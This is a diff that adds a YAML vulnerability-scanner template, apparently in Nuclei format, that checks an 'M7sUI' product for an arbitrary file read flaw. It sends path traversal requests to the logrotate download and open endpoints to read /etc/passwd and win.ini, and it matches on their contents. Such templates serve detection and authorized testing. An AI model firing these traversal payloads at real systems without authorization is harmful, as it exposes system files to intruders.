@@ -1,0 +1,45 @@
+id: M7sUI-ReadAnyFile
+
+info:
+  name: M7sUI-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: M7sUI-ReadAnyFile
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /api/logrotate/download?file=../../../etc/passwd HTTP/1.1
+        Host: {{Host}}
+
+      - |
+        GET /api/logrotate/download?file=../C://Windows/win.ini HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+      - |
+        GET /api/logrotate/open?file=../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+      - |
+        GET /api/logrotate/open?file=../C://Windows/win.ini HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "MAPI"
+          - "root:x"
+        condition: or
+        part: body
+
+      - type: status
+        status:
+          - 200
